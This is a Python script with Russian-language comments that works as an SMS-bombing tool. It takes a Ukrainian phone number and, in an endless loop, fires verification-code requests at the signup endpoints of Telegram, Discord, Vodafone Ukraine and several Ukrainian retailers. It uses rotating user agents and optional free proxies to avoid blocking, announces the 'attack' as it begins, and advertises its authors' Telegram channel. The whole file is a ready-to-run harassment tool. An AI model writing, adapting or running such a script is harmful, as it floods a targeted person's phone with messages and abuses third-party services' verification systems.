#Установка необходимых модулей
import requests
import fake_useragent
import time
import os
import termcolor
import threading
from threading import Thread
from termcolor import colored
import colorama
from colorama import Fore, Back, Style
#Закрытие терминала, показ логотипа
os.system('cls' if os.name == 'nt' else 'clear')

def generate_proxy():
    proxy = requests.get("https://gimmeproxy.com/api/getProxy?curl=true&protocol=http&supportsHttps=true").text
    print(proxy)
    return {"http": proxy, "https": proxy}
    main()

print(colored( '''
  ___   _ __     __ _   _ __ ___  
 / __| | '_ \   / _` | | '_ ` _ \ 
 \__ \ | |_) | | (_| | | | | | | |
 |___/ | .__/   \__,_| |_| |_| |_|
       |_|
''','cyan'))
print(colored( '''
 -----------------------------------------------        
| ❤️Telegram Channel - @privatesoft0❤️            | 
| Developers - @soeden1x, @Cotafe , @ricehh     |
 -----------------------------------------------
''','red'))

#Переадресация на Telegram-Channel
try:
    os.system("termux-open-url https://t.me/joinchat/ra49fxzPRw5kNzYy")#Просим, не убирать эту строку
except:
  pass

user = fake_useragent.UserAgent().random
headers = {'user_agent' : user}
print(Fore.MAGENTA +"Введите номер телефонa (без +): ")
number = input( Fore.BLUE + "spammer>> " + Fore.RED +("+(380) "))
print()
print(Fore.MAGENTA +"Использовать прокси? (y/n):")
proxy = input(Fore.BLUE +"spammer>> ")
if proxy.lower() == "y":
    proxies = generate_proxy()
else:
    proxies = None
print()
print(Fore.YELLOW +"[*] Атака началась!")
print("[*] Для остановки используй cntrl+z")

while True:
  user = fake_useragent.UserAgent().random
  headers = {'user_agent : user'}
#Сервисы
  try:
      requests.post("https://my.telegram.org/auth/send_password", data={"phone": "+380" + number}, proxies=proxies)
      print(Fore.GREEN +"Сообщение отправлено - Telegram")
  except:
      print("Сбой отправки - Telegram")
  try:
      requests.post("https://discord.com/api/v9/auth/register/phone", json={"phone": "+380" + number}, proxies=proxies)
      print("Сообщение отправлено - Discord")
  except:
      print("Сбой отправки - Discord")
  try:
      requests.get("https://i.api.kari.com/ecommerce/client/registration/verify/phone/code?phone=%2B" + number, proxies=proxies)
      print("Сообщение отправлено - Kari")
  except:
      print("Сбой отправки - Kari")
  try:
      requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": "380" + number}, proxies=proxies)
      print("Сообщение отправлено - Vodafone")
  except:
      print("Сбой отправки - Vodafone")
  try:
      requests.post("https://megasport.ua/api/auth/phone/?language=ru", json={"phone": "+380" + number}, proxies=proxies)
      print("Сообщение отправлено - MegaSport")
  except:
      print("Сбой отправки - MegaSport")
  try:
      requests.post("https://zolotakoroleva.ua/api/send-otp", json={"params": {"phone": "+380" + number}}, proxies=proxies)
      print("Сообщение отправлено - ZolotaKoroleva")
  except:
      print("Сбой отправки - ZolotaKoroleva")
  try:
      requests.post("https://mozayka.com.ua/!processing/ajax.php", data={"phone": "+380" + number, "mp_m": "sendsmscodereg", "token": "9d064a2beeb932ae5de11f74631269b4"}, proxies=proxies)
      print("Сообщение отправлено - EvaMozayka")
  except:
      print("Сбой отправки - EvaMozayka")
      time.sleep(1)
